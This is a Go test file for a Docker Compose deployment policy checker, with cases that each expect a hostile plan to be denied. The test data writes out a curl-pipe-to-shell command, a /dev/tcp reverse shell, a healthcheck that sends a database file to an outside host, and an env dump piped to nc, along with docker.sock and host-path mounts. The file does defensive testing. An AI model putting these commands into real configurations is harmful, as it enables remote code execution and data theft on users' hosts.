package policy_test

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"

	"github.com/compose-spec/compose-go/v2/types"

	"github.com/aiulian25/composewright/internal/composefile"
	"github.com/aiulian25/composewright/internal/config"
	"github.com/aiulian25/composewright/internal/ir"
	"github.com/aiulian25/composewright/internal/policy"
)

var generate = flag.Bool("generate", false, "rewrite testdata/adversarial from the mutations in this file")

const adversarialDir = "../../testdata/adversarial"

// goodPlan passes every rule: an app with a healthcheck, a postgres sidecar
// with pg_isready, a generated secret, a derived secret DSN, one named volume.
func goodPlan() *ir.IR {
	provenance := ir.Provenance{Source: ir.SourceCompose, SourceRef: "docker-compose.yml:1", Confidence: ir.ConfidenceHigh}
	plan := &ir.IR{
		IRVersion: ir.Version,
		App:       ir.App{Name: "miniflux", Summary: "Minimalist feed reader.", UpstreamURL: "https://github.com/miniflux/v2"},
		Services: []ir.Service{
			{
				Name: "miniflux", Role: ir.RoleApp, Provenance: provenance,
				Image: ir.Image{Registry: "docker.io", Repository: "miniflux/miniflux", Tag: "2.2.3", Provenance: provenance},
				Env: []ir.EnvRef{
					{Key: "DATABASE_URL", Ref: "DATABASE_URL", Required: true, Secret: true, Description: "Postgres DSN", Provenance: provenance},
					{Key: "BASE_URL", Ref: "BASE_URL", Required: true, Description: "Public URL", Provenance: provenance},
				},
				Ports:     []ir.Port{{Container: 8080, Protocol: ir.ProtocolTCP, Publish: true, Description: "web UI", Provenance: provenance}},
				DependsOn: []ir.Dependency{{Service: "db", Condition: ir.ConditionHealthy}},
				Healthcheck: ir.Healthcheck{Test: []string{"CMD", "/usr/bin/miniflux", "-healthcheck", "auto"},
					Interval: "30s", Timeout: "5s", Retries: 5, StartPeriod: "20s", Provenance: provenance},
				Resources: ir.Resources{MemoryLimit: "256m", CPUs: "1", PIDsLimit: 256},
			},
			{
				Name: "db", Role: ir.RoleDB, Provenance: provenance,
				Image: ir.Image{Registry: "docker.io", Repository: "library/postgres", Tag: "17", Provenance: provenance},
				Env: []ir.EnvRef{
					{Key: "POSTGRES_USER", Ref: "POSTGRES_USER", Required: true, Description: "db user", Provenance: provenance},
					{Key: "POSTGRES_PASSWORD", Ref: "POSTGRES_PASSWORD", Required: true, Secret: true, Description: "db password", Provenance: provenance},
				},
				Volumes: []ir.Volume{{Name: "miniflux-db", ContainerPath: "/var/lib/postgresql/data", Description: "database", Provenance: provenance}},
				Healthcheck: ir.Healthcheck{Test: []string{"CMD-SHELL", "pg_isready -U $$POSTGRES_USER"},
					Interval: "10s", Timeout: "5s", Retries: 5, Provenance: provenance},
				Resources: ir.Resources{MemoryLimit: "512m", CPUs: "1", PIDsLimit: 256},
			},
		},
		EnvFile: []ir.EnvFileEntry{
			{Key: "BASE_URL", Value: "http://localhost:8080", Required: true, Description: "Public URL", Provenance: provenance},
			{Key: "POSTGRES_USER", Value: "miniflux", Required: true, Description: "db user", Provenance: provenance},
			{Key: "POSTGRES_PASSWORD", Generate: ir.GenerateHex32, Secret: true, Required: true, Description: "db password", Provenance: provenance},
			{Key: "DATABASE_URL", Value: "postgres://miniflux:${POSTGRES_PASSWORD}@db/miniflux?sslmode=disable", Secret: true, Required: true, Description: "DSN", Provenance: provenance},
		},
		Probe:      ir.Probe{Service: "miniflux", Port: 8080, Path: "/healthcheck", Expect: []int{200}},
		Confidence: ir.ConfidenceHigh,
	}
	plan.Normalize()
	return plan
}

func baseInput(plan *ir.IR) policy.Input {
	return policy.Input{
		Plan: plan,
		Profile: config.Profile{
			Networks: []config.ProfileNetwork{{Name: "npm_default", Kind: "proxy", Provider: "npm"}},
			Storage:  config.Storage{Style: config.StorageVolumes, BasePath: "/srv/docker"},
		},
		AllowRegistries: []string{"docker.io/library/*", "ghcr.io/*", "lscr.io/linuxserver/*", "quay.io/*"},
		RepositoryOwner: "miniflux",
	}
}

type planCase struct {
	name     string
	rule     string
	want     policy.Severity
	blocked  bool
	granted  []string
	extra    []string
	owner    string
	mutate   func(plan *ir.IR)
	scenario string // non-empty: also written to testdata/adversarial as this file name
}

var planCases = []planCase{
	// The plan's own image is on Docker Hub, so the person trusts that
	// namespace, as the Review page's Trust button does; otherwise P1 warns.
	{name: "clean plan passes", extra: []string{"docker.io/miniflux/*"}, mutate: func(*ir.IR) {}},

	{name: "P1 unknown registry denied", rule: "P1", want: policy.Deny, blocked: true, scenario: "evil-registry",
		mutate: func(plan *ir.IR) { plan.Services[0].Image.Registry = "evil.example" }},
	{name: "P1 foreign docker hub namespace denied", rule: "P1", want: policy.Deny, blocked: true, scenario: "image-swap-miner",
		mutate: func(plan *ir.IR) { plan.Services[0].Image.Repository = "someone/miner" }},
	{name: "P1 owner name on Docker Hub warns", rule: "P1", want: policy.Warn,
		mutate: func(plan *ir.IR) { plan.Services[0].Image.Repository = "miniflux/miniflux-arm" }},
	{name: "P1 owner name on Quay warns", rule: "P1", want: policy.Warn,
		mutate: func(plan *ir.IR) { plan.Services[0].Image.Registry = "quay.io" }},
	{name: "P1 owner namespace trusted on purpose", rule: "P1", want: policy.OK, extra: []string{"docker.io/miniflux/*"},
		mutate: func(plan *ir.IR) { plan.Services[0].Image.Repository = "miniflux/miniflux-arm" }},
	{name: "P1 owner namespace on ghcr is the GitHub account", rule: "P1", want: policy.OK,
		mutate: func(plan *ir.IR) { plan.Services[0].Image.Registry = "ghcr.io" }},
	{name: "P1 host-wide ghcr narrowed to owner", rule: "P1", want: policy.Deny, blocked: true, scenario: "ghcr-other-namespace",
		mutate: func(plan *ir.IR) {
			plan.Services[0].Image.Registry = "ghcr.io"
			plan.Services[0].Image.Repository = "attacker/miniflux"
		}},
	{name: "P1 host-wide ghcr literal without owner", rule: "P1", want: policy.OK, owner: "-",
		mutate: func(plan *ir.IR) {
			plan.Services[0].Image.Registry = "ghcr.io"
			plan.Services[0].Image.Repository = "anyone/thing"
		}},
	{name: "P1 --allow-registry unlocks", rule: "P1", want: policy.OK, extra: []string{"evil.example/*"},
		mutate: func(plan *ir.IR) { plan.Services[0].Image.Registry = "evil.example" }},
	{name: "P1 malformed repository denied", rule: "P1", want: policy.Deny, blocked: true,
		mutate: func(plan *ir.IR) { plan.Services[0].Image.Repository = "Upper/Case" }},

	{name: "P2 latest warns", rule: "P2", want: policy.Warn, mutate: func(plan *ir.IR) { plan.Services[0].Image.Tag = "latest" }},
	{name: "P2 missing tag denied", rule: "P2", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services[0].Image.Tag = "" }},
	{name: "P2 interpolated tag denied", rule: "P2", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services[0].Image.Tag = "${VERSION}" }},
	{name: "P2 bad digest denied", rule: "P2", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services[0].Image.Digest = "md5:abc" }},

	{name: "P3 app without healthcheck warns", rule: "P3", want: policy.Warn, mutate: func(plan *ir.IR) {
		plan.Services[0].Healthcheck = ir.Healthcheck{}
		plan.Probe = ir.Probe{}
	}},
	{name: "P3 omitted with reason is fine", rule: "P3", want: policy.OK, mutate: func(plan *ir.IR) {
		plan.Services[0].Healthcheck = ir.Healthcheck{OmittedReason: "distroless image without a probe tool"}
	}},
	{name: "P3 worker without healthcheck is fine", rule: "P3", want: policy.OK, mutate: func(plan *ir.IR) {
		plan.Services = append(plan.Services, ir.Service{Name: "worker", Role: ir.RoleWorker, Image: plan.Services[0].Image, Resources: plan.Services[0].Resources})
	}},
	{name: "P3 malformed test denied", rule: "P3", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) {
		plan.Services[0].Healthcheck.Test = []string{"wget", "-q"}
	}},
	{name: "P3 bad duration denied", rule: "P3", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services[0].Healthcheck.Interval = "often" }},

	{name: "P4 published low host port needs grant", rule: "P4", want: policy.Need, blocked: true, scenario: "low-port",
		mutate: func(plan *ir.IR) { plan.Services[0].Ports[0].HostPort = 53 }},
	{name: "P4 granted low port passes", rule: "P4", want: policy.OK, granted: []string{ir.NeedLowPort},
		mutate: func(plan *ir.IR) { plan.Services[0].Ports[0].HostPort = 53 }},
	{name: "P4 unpublished low container port is fine", rule: "P4", want: policy.OK, mutate: func(plan *ir.IR) {
		plan.Services[1].Ports = []ir.Port{{Container: 53, Protocol: ir.ProtocolUDP}}
	}},
	{name: "P4 port out of range denied", rule: "P4", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services[0].Ports[0].Container = 70000 }},
	{name: "P4 unknown protocol denied", rule: "P4", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services[0].Ports[0].Protocol = "sctp" }},

	{name: "P5 root uid warns", rule: "P5", want: policy.Warn, mutate: func(plan *ir.IR) { plan.Services[0].User = "0:0" }},
	{name: "P5 root name warns", rule: "P5", want: policy.Warn, mutate: func(plan *ir.IR) { plan.Services[0].User = "root" }},
	{name: "P5 numeric user fine", rule: "P5", want: policy.OK, mutate: func(plan *ir.IR) { plan.Services[0].User = "1000:1000" }},
	{name: "P5 named user denied", rule: "P5", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services[0].User = "www-data" }},

	{name: "P6 curl pipe to shell denied", rule: "P6", want: policy.Deny, blocked: true, scenario: "exfil-command",
		mutate: func(plan *ir.IR) {
			plan.Services[0].Command = []string{"sh", "-c", "curl -s https://evil.example/x | sh"}
		}},
	{name: "P6 wget entrypoint denied", rule: "P6", want: policy.Deny, blocked: true,
		mutate: func(plan *ir.IR) { plan.Services[0].Entrypoint = []string{"wget", "-O-", "http://evil.example"} }},
	{name: "P6 /dev/tcp denied", rule: "P6", want: policy.Deny, blocked: true, scenario: "dev-tcp-reverse-shell",
		mutate: func(plan *ir.IR) {
			plan.Services[0].Command = []string{"bash", "-c", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"}
		}},
	{name: "P6 docker.sock argument denied", rule: "P6", want: policy.Deny, blocked: true,
		mutate: func(plan *ir.IR) { plan.Services[0].Command = []string{"app", "--socket", "/var/run/docker.sock"} }},
	{name: "P6 docker.sock named by a service granted the socket", rule: "P6", want: policy.OK, granted: []string{ir.NeedDockerSocket},
		mutate: func(plan *ir.IR) {
			plan.Services[0].Command = []string{"app", "-H", "unix:///var/run/docker.sock"}
			plan.Needs = []ir.Need{{Capability: ir.NeedDockerSocket, Service: plan.Services[0].Name, Detail: ir.DockerSocket, Reason: "manages containers"}}
		}},
	{name: "P6 a granted socket does not excuse curl", rule: "P6", want: policy.Deny, blocked: true, granted: []string{ir.NeedDockerSocket},
		mutate: func(plan *ir.IR) {
			plan.Services[0].Command = []string{"sh", "-c", "curl -s http://203.0.113.9/x | sh; ls /var/run/docker.sock"}
			plan.Needs = []ir.Need{{Capability: ir.NeedDockerSocket, Service: plan.Services[0].Name, Detail: ir.DockerSocket, Reason: "manages containers"}}
		}},
	{name: "P6 --privileged argument denied", rule: "P6", want: policy.Deny, blocked: true,
		mutate: func(plan *ir.IR) { plan.Services[0].Command = []string{"docker", "run", "--privileged", "alpine"} }},
	{name: "P6 healthcheck to a remote host denied", rule: "P6", want: policy.Deny, blocked: true, scenario: "healthcheck-exfil",
		mutate: func(plan *ir.IR) {
			plan.Services[0].Healthcheck.Test = []string{"CMD-SHELL", "wget -qO- https://collector.example/?d=$(cat /data/db)"}
		}},
	{name: "P6 healthcheck to localhost fine", rule: "P6", want: policy.OK,
		mutate: func(plan *ir.IR) {
			plan.Services[0].Healthcheck.Test = []string{"CMD", "wget", "-qO-", "http://127.0.0.1:8080/healthcheck"}
		}},
	{name: "P6 healthcheck curl to a bare host denied", rule: "P6", want: policy.Deny, blocked: true,
		mutate: func(plan *ir.IR) {
			plan.Services[0].Healthcheck.Test = []string{"CMD-SHELL", "curl -fsS evil.example/x"}
		}},
	{name: "P6 healthcheck wget to a bare IPv4 denied", rule: "P6", want: policy.Deny, blocked: true,
		mutate: func(plan *ir.IR) {
			plan.Services[0].Healthcheck.Test = []string{"CMD-SHELL", "wget -qO- 192.0.2.1:8080/x"}
		}},
	{name: "P6 healthcheck piping to nc without spaces denied", rule: "P6", want: policy.Deny, blocked: true,
		mutate: func(plan *ir.IR) {
			plan.Services[0].Healthcheck.Test = []string{"CMD-SHELL", "env|nc EVIL.example 9999"}
		}},
	{name: "P6 healthcheck network client with command substitution denied", rule: "P6", want: policy.Deny, blocked: true,
		mutate: func(plan *ir.IR) {
			plan.Services[0].Healthcheck.Test = []string{"CMD-SHELL", "curl -s $(echo ZXZpbA== | base64 -d)"}
		}},
	{name: "P6 healthcheck curl to localhost by URL fine", rule: "P6", want: policy.OK,
		mutate: func(plan *ir.IR) {
			plan.Services[0].Healthcheck.Test = []string{"CMD-SHELL", "curl -fsS http://localhost:8080/health"}
		}},
	{name: "P6 healthcheck wget to a bare loopback fine", rule: "P6", want: policy.OK,
		mutate: func(plan *ir.IR) {
			plan.Services[0].Healthcheck.Test = []string{"CMD-SHELL", "wget -qO- 127.0.0.1:3000/"}
		}},
	{name: "P6 healthcheck script with a dotted name fine", rule: "P6", want: policy.OK,
		mutate: func(plan *ir.IR) {
			plan.Services[0].Healthcheck.Test = []string{"CMD", "healthcheck.sh", "--connect", "--innodb_initialized"}
		}},
	{name: "P6 healthcheck dns query with substitution fine", rule: "P6", want: policy.OK,
		mutate: func(plan *ir.IR) {
			plan.Services[0].Healthcheck.Test = []string{"CMD-SHELL", "dig -p $$(pihole-FTL --config dns.port) +short @127.0.0.1 pi.hole || exit 1"}
		}},
	{name: "P6 benign command fine", rule: "P6", want: policy.OK,
		mutate: func(plan *ir.IR) { plan.Services[0].Command = []string{"/usr/bin/miniflux", "-migrate"} }},

	{name: "P7 command substitution denied", rule: "P7", want: policy.Deny, blocked: true, scenario: "env-command-substitution",
		mutate: func(plan *ir.IR) { plan.EnvFile[0].Value = "$(curl evil.example)" }},
	{name: "P7 backticks denied", rule: "P7", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.EnvFile[0].Value = "`id`" }},
	{name: "P7 newline denied", rule: "P7", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.EnvFile[0].Value = "a\nb" }},
	{name: "P7 literal secret denied", rule: "P7", want: policy.Deny, blocked: true, scenario: "secret-in-value",
		mutate: func(plan *ir.IR) {
			plan.EnvFile[2].Generate = ""
			plan.EnvFile[2].Value = "hunter2"
		}},
	{name: "P7 required secret without value warns", rule: "P7", want: policy.Warn, mutate: func(plan *ir.IR) { plan.EnvFile[2].Generate = "" }},
	{name: "P7 generated non-secret denied", rule: "P7", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.EnvFile[2].Secret = false }},
	{name: "P7 service literal secret denied", rule: "P7", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) {
		plan.Services[1].Env[1].Ref = ""
		plan.Services[1].Env[1].Literal = "hunter2"
	}},
	{name: "P7 dangling ref denied", rule: "P7", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services[0].Env[1].Ref = "NOPE" }},
	{name: "P7 ref and literal both set denied", rule: "P7", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services[0].Env[1].Literal = "x" }},
	{name: "P7 dangling interpolation denied", rule: "P7", want: policy.Deny, blocked: true,
		mutate: func(plan *ir.IR) { plan.EnvFile[3].Value = "postgres://miniflux:${NOPE}@db/miniflux" }},
	{name: "P7 self reference denied", rule: "P7", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.EnvFile[0].Value = "${BASE_URL}/x" }},
	{name: "P7 unknown generator denied", rule: "P7", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.EnvFile[2].Generate = "password6" }},
	{name: "P7 file env key must be a secret _FILE", rule: "P7", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.EnvFile[0].FileEnvKey = "BASE_URL_FILE" }},

	{name: "P8 volume name with slash denied", rule: "P8", want: policy.Deny, blocked: true, scenario: "mount-root",
		mutate: func(plan *ir.IR) { plan.Services[1].Volumes[0].Name = "/" }},
	{name: "P8 relative target denied", rule: "P8", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services[1].Volumes[0].ContainerPath = "data" }},
	{name: "P8 docker.sock target denied", rule: "P8", want: policy.Deny, blocked: true, scenario: "docker-sock-volume",
		mutate: func(plan *ir.IR) { plan.Services[1].Volumes[0].ContainerPath = "/var/run/docker.sock" }},
	{name: "P8 /proc denied", rule: "P8", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services[1].Volumes[0].ContainerPath = "/proc" }},
	{name: "P8 /sys subpath denied", rule: "P8", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services[1].Volumes[0].ContainerPath = "/sys/fs/cgroup" }},
	{name: "P8 root target denied", rule: "P8", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services[1].Volumes[0].ContainerPath = "/" }},
	{name: "P8 duplicate target denied", rule: "P8", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) {
		plan.Services[1].Volumes = append(plan.Services[1].Volumes, ir.Volume{Name: "other", ContainerPath: "/var/lib/postgresql/data/"})
	}},

	{name: "P9 host network blocks until granted", rule: "P9", want: policy.Need, blocked: true, scenario: "host-network-need",
		mutate: func(plan *ir.IR) {
			plan.Needs = []ir.Need{{Capability: ir.NeedHostNetwork, Service: "miniflux", Reason: "mDNS discovery"}}
		}},
	{name: "P9 granted need passes", rule: "P9", want: policy.OK, granted: []string{ir.NeedHostNetwork},
		mutate: func(plan *ir.IR) {
			plan.Needs = []ir.Need{{Capability: ir.NeedHostNetwork, Service: "miniflux", Reason: "mDNS discovery"}}
		}},
	{name: "P9 a different grant does not unlock", rule: "P9", want: policy.Need, blocked: true, granted: []string{ir.NeedDevices}, scenario: "privileged-need",
		mutate: func(plan *ir.IR) {
			plan.Needs = []ir.Need{{Capability: ir.NeedPrivileged, Service: "miniflux", Reason: "README says so"}}
		}},
	{name: "P9 need for unknown service denied", rule: "P9", want: policy.Deny, blocked: true,
		mutate: func(plan *ir.IR) {
			plan.Needs = []ir.Need{{Capability: ir.NeedDevices, Service: "ghost", Detail: "/dev/ttyUSB0", Reason: "zigbee"}}
		}},
	{name: "P9 docker socket blocks until granted", rule: "P9", want: policy.Need, blocked: true,
		mutate: func(plan *ir.IR) {
			plan.Needs = []ir.Need{{Capability: ir.NeedDockerSocket, Service: "miniflux", Detail: ir.DockerSocket, Reason: "manages containers"}}
		}},
	{name: "P9 granted docker socket passes", rule: "P9", want: policy.OK, granted: []string{ir.NeedDockerSocket},
		mutate: func(plan *ir.IR) {
			plan.Needs = []ir.Need{{Capability: ir.NeedDockerSocket, Service: "miniflux", Detail: ir.DockerSocket, Reason: "manages containers"}}
		}},
	{name: "P9 unknown capability denied", rule: "P9", want: policy.Deny, blocked: true,
		mutate: func(plan *ir.IR) { plan.Needs = []ir.Need{{Capability: "sys_admin", Service: "miniflux", Reason: "x"}} }},

	{name: "P10 missing limits are filled", rule: "P10", want: policy.Fix, mutate: func(plan *ir.IR) { plan.Services[0].Resources = ir.Resources{} }},
	{name: "P10 bad memory denied", rule: "P10", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services[0].Resources.MemoryLimit = "lots" }},
	{name: "P10 bad cpus denied", rule: "P10", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services[0].Resources.CPUs = "-1" }},

	{name: "P11 missing target denied", rule: "P11", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services[0].DependsOn[0].Service = "ghost" }},
	{name: "P11 cycle denied", rule: "P11", want: policy.Deny, blocked: true, scenario: "dependency-cycle",
		mutate: func(plan *ir.IR) {
			plan.Services[1].DependsOn = []ir.Dependency{{Service: "miniflux", Condition: ir.ConditionStarted}}
		}},
	{name: "P11 self dependency denied", rule: "P11", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services[0].DependsOn[0].Service = "miniflux" }},
	{name: "P11 healthy condition without healthcheck denied", rule: "P11", want: policy.Deny, blocked: true,
		mutate: func(plan *ir.IR) { plan.Services[1].Healthcheck = ir.Healthcheck{OmittedReason: "none"} }},
	{name: "P11 unknown condition denied", rule: "P11", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services[0].DependsOn[0].Condition = "eventually" }},

	{name: "P12 nine services denied", rule: "P12", want: policy.Deny, blocked: true, scenario: "nine-services", mutate: func(plan *ir.IR) {
		for index := range 7 {
			extra := plan.Services[1]
			extra.Name = fmt.Sprintf("extra%d", index)
			extra.Role = ir.RoleWorker
			plan.Services = append(plan.Services, extra)
		}
	}},
	{name: "P12 zero services denied", rule: "P12", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services = nil; plan.Probe = ir.Probe{} }},

	{name: "C duplicate service names denied", rule: "C", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services[1].Name = "miniflux" }},
	{name: "C no app role denied", rule: "C", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services[0].Role = ir.RoleWorker }},
	{name: "C two app roles denied", rule: "C", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Services[1].Role = ir.RoleApp }},
	{name: "C duplicate env_file keys denied", rule: "C", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.EnvFile = append(plan.EnvFile, plan.EnvFile[0]) }},
	{name: "C duplicate service env denied", rule: "C", want: policy.Deny, blocked: true,
		mutate: func(plan *ir.IR) { plan.Services[0].Env = append(plan.Services[0].Env, plan.Services[0].Env[0]) }},
	{name: "C probe for unknown service denied", rule: "C", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Probe.Service = "ghost" }},
	{name: "C probe on a port nobody listens on denied", rule: "C", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.Probe.Port = 9999 }},
	{name: "C bad app name denied", rule: "C", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.App.Name = "Mini Flux!" }},
	{name: "C unknown ir_version denied", rule: "C", want: policy.Deny, blocked: true, mutate: func(plan *ir.IR) { plan.IRVersion = "2" }},
}

func TestEvaluate(t *testing.T) {
	for _, testCase := range planCases {
		t.Run(testCase.name, func(t *testing.T) {
			plan := goodPlan()
			testCase.mutate(plan)
			input := baseInput(plan)
			input.GrantedNeeds = testCase.granted
			input.ExtraRegistries = testCase.extra
			if testCase.owner == "-" {
				input.RepositoryOwner = ""
			}
			report := policy.Evaluate(input)
			if testCase.rule == "" {
				if len(report.Findings) != 0 {
					t.Fatalf("expected no findings, got %+v", report.Findings)
				}
				return
			}
			if testCase.want == policy.OK {
				for _, severity := range []policy.Severity{policy.Warn, policy.Need, policy.Deny} {
					if report.Has(testCase.rule, severity) {
						t.Fatalf("rule %s fired at %s: %+v", testCase.rule, severity, report.Findings)
					}
				}
			} else if !report.Has(testCase.rule, testCase.want) {
				t.Fatalf("want %s at %s, got %+v", testCase.rule, testCase.want, report.Findings)
			}
			if report.Blocked() != testCase.blocked {
				t.Fatalf("Blocked() = %v, want %v: %+v", report.Blocked(), testCase.blocked, report.Findings)
			}
		})
	}
}

// structuralKeys are compose features the IR must be unable to express.
var structuralKeys = []string{
	"privileged", "cap_add", "devices", "device_cgroup_rules", "gpus", "network_mode", "pid", "ipc", "userns_mode",
	"cgroup", "cgroup_parent", "security_opt", "sysctls", "ulimits", "runtime", "volumes_from", "build", "extends",
	"external", "use_api_socket", "driver_opts", "bind", "tmpfs", "host_path", "networks", "labels", "configs",
	"secrets", "group_add", "post_start", "x-composewright",
}

func TestStructuralKeysRejectedEverywhere(t *testing.T) {
	encoded, err := json.Marshal(goodPlan())
	if err != nil {
		t.Fatal(err)
	}
	locations := []string{"", "app", "services.0", "services.0.image", "services.1.volumes.0", "services.0.env.0",
		"services.0.ports.0", "services.0.healthcheck", "env_file.0", "probe"}
	for _, location := range locations {
		for _, key := range structuralKeys {
			document := map[string]any{}
			if err := json.Unmarshal(encoded, &document); err != nil {
				t.Fatal(err)
			}
			at(t, document, location)[key] = true
			injected, _ := json.Marshal(document)
			if _, err := ir.Decode(injected); err == nil {
				t.Errorf("decoder accepted %q at %q", key, location)
			}
			if _, err := ir.DecodeModelOutput(injected); err == nil {
				t.Errorf("schema accepted %q at %q", key, location)
			}
		}
	}
}

func at(t *testing.T, document map[string]any, location string) map[string]any {
	t.Helper()
	node := any(document)
	for _, segment := range strings.Split(location, ".") {
		if segment == "" {
			continue
		}
		switch value := node.(type) {
		case map[string]any:
			node = value[segment]
		case []any:
			index, err := strconv.Atoi(segment)
			if err != nil {
				t.Fatal(err)
			}
			node = value[index]
		}
	}
	return node.(map[string]any)
}

func TestSchemaNamesNoStructuralKey(t *testing.T) {
	var schema map[string]any
	if err := json.Unmarshal(ir.SchemaJSON(), &schema); err != nil {
		t.Fatal(err)
	}
	var walk func(path string, node map[string]any)
	walk = func(path string, node map[string]any) {
		properties, _ := node["properties"].(map[string]any)
		for name, child := range properties {
			for _, key := range structuralKeys {
				if name == key {
					t.Errorf("%s defines structural property %q", path, name)
				}
			}
			walk(path+"."+name, child.(map[string]any))
		}
		if items, found := node["items"].(map[string]any); found {
			walk(path+"[]", items)
		}
	}
	walk("root", schema)
	for name, definition := range schema["$defs"].(map[string]any) {
		walk("$defs."+name, definition.(map[string]any))
	}
}

func loadCompose(t *testing.T, content string) *types.Project {
	t.Helper()
	project, err := composefile.Load(context.Background(), "compose.yaml", []byte(content), nil, false)
	if err != nil {
		t.Fatalf("load compose: %v\n%s", err, content)
	}
	return project
}

const nginx = "docker.io/library/nginx:1.27"

func TestEvaluateYAML(t *testing.T) {
	base := t.TempDir()
	escape := filepath.Join(base, "escape")
	if err := os.Symlink("/etc", escape); err != nil {
		t.Fatal(err)
	}
	service := func(extra string) string {
		return "services:\n  app:\n    image: " + nginx + "\n" + extra
	}
	cases := []struct {
		name    string
		yaml    string
		want    policy.Severity
		granted []string
		needs   []ir.Need
	}{
		{"plain service", service(""), policy.OK, nil, nil},
		{"privileged", service("    privileged: true\n"), policy.Deny, nil, nil},
		{"privileged granted and requested", service("    privileged: true\n"), policy.OK, []string{ir.NeedPrivileged},
			[]ir.Need{{Capability: ir.NeedPrivileged, Service: "app"}}},
		{"privileged granted but never requested", service("    privileged: true\n"), policy.Deny, []string{ir.NeedPrivileged}, nil},
		{"cap_add", service("    cap_add: [NET_ADMIN]\n"), policy.Deny, nil, nil},
		{"network_mode host", service("    network_mode: host\n"), policy.Deny, nil, nil},
		{"network_mode container", service("    network_mode: container:other\n"), policy.Deny, nil, nil},
		{"pid host", service("    pid: host\n"), policy.Deny, nil, nil},
		{"ipc host", service("    ipc: host\n"), policy.Deny, nil, nil},
		{"build", "services:\n  app:\n    build: .\n", policy.Deny, nil, nil},
		{"devices", service("    devices: ['/dev/ttyUSB0:/dev/ttyUSB0']\n"), policy.Deny, nil, nil},
		{"sysctls", service("    sysctls: {net.ipv4.ip_forward: 1}\n"), policy.Deny, nil, nil},
		{"runtime", service("    runtime: nvidia\n"), policy.Deny, nil, nil},
		{"security_opt no-new-privileges", service("    security_opt: ['no-new-privileges:true']\n"), policy.OK, nil, nil},
		{"security_opt seccomp unconfined", service("    security_opt: ['seccomp=unconfined']\n"), policy.Deny, nil, nil},
		{"group_add", service("    group_add: ['999']\n"), policy.Deny, nil, nil},
		{"post_start hook", service("    post_start:\n      - command: [id]\n        privileged: true\n"), policy.Deny, nil, nil},
		{"volumes_from", service("    volumes_from: [other]\n") + "  other:\n    image: " + nginx + "\n", policy.Deny, nil, nil},
		{"docker.sock bind", service("    volumes: ['/var/run/docker.sock:/var/run/docker.sock']\n"), policy.Deny, nil, nil},
		{"docker.sock granted where asked", service("    volumes: ['/var/run/docker.sock:/var/run/docker.sock']\n"), policy.OK, []string{ir.NeedDockerSocket},
			[]ir.Need{{Capability: ir.NeedDockerSocket, Service: "app", Detail: "/var/run/docker.sock"}}},
		{"docker.sock granted, at another target", service("    volumes: ['/var/run/docker.sock:/etc/docker.sock']\n"), policy.Deny, []string{ir.NeedDockerSocket},
			[]ir.Need{{Capability: ir.NeedDockerSocket, Service: "app", Detail: "/var/run/docker.sock"}}},
		{"bind outside base path", service("    volumes: ['/etc:/data']\n"), policy.Deny, nil, nil},
		{"bind under base path", service("    volumes: ['" + base + "/miniflux/data:/data']\n"), policy.OK, nil, nil},
		{"bind escaping through a symlink", service("    volumes: ['" + escape + "/ssh:/data']\n"), policy.Deny, nil, nil},
		{"bind with dot-dot", service("    volumes: ['" + base + "/../../etc:/data']\n"), policy.Deny, nil, nil},
		{"relative bind", service("    volumes: ['./data:/data']\n"), policy.Deny, nil, nil},
		{"bind propagation", service("    volumes:\n      - type: bind\n        source: " + base + "/x\n        target: /x\n        bind: {propagation: rshared}\n"), policy.Deny, nil, nil},
		{"granted bind mount", service("    volumes: ['/media/music:/music:ro']\n"), policy.OK, []string{ir.NeedBindMount},
			[]ir.Need{{Capability: ir.NeedBindMount, Service: "app", Detail: "/media/music"}}},
		{"external network in profile", service("    networks: [npm_default]\n") + "networks:\n  npm_default: {external: true}\n", policy.OK, nil, nil},
		{"external network not in profile", service("    networks: [traefik]\n") + "networks:\n  traefik: {external: true}\n", policy.Deny, nil, nil},
		{"macvlan network", service("    networks: [lan]\n") + "networks:\n  lan: {driver: macvlan}\n", policy.Deny, nil, nil},
		{"external volume", service("    volumes: ['data:/data']\n") + "volumes:\n  data: {external: true}\n", policy.Deny, nil, nil},
		{"volume driver_opts bind", service("    volumes: ['data:/data']\n") + "volumes:\n  data:\n    driver_opts: {type: none, o: bind, device: /}\n", policy.Deny, nil, nil},
